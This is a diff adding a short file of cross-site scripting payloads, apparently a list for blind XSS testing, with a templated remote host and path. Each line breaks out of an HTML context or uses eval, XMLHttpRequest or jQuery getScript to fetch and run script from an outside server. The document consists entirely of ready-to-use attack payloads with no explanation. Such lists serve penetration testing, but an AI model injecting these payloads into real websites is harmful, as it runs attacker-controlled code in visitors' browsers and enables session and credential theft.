@@ -1,0 +1,6 @@
+<script src=http://<URL_HERE>/<PARAM>></script>
+'><script src=http://<URL_HERE>/<PARAM>></script>
+"><script src=http://<URL_HERE>/<PARAM>></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://<URL_HERE>/<PARAM>\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//<URL_HERE>/<PARAM>");a.send();</script>
+<script>$.getScript("http://<URL_HERE>/<PARAM>")</script>
